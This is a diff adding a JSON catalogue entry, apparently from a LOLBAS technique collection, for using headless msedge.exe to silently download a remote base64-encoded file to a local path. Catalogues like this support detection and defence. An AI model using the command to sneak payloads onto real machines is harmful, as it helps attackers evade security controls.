@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-msedge-exe-download-2",
+  "name": "LOLBAS · Msedge.exe (Download) #2",
+  "command": "msedge.exe --headless --enable-logging --disable-gpu --dump-dom \"{REMOTEURL:.base64.html}\" > {PATH:.b64}",
+  "description": "Edge will silently download the file. File extension should be .html and binaries should be encoded.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "msedge",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Msedge/",
+  "upstream_id": "Msedge.exe/Download/1",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — Msedge.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Msedge/"
+    }
+  ]
+}
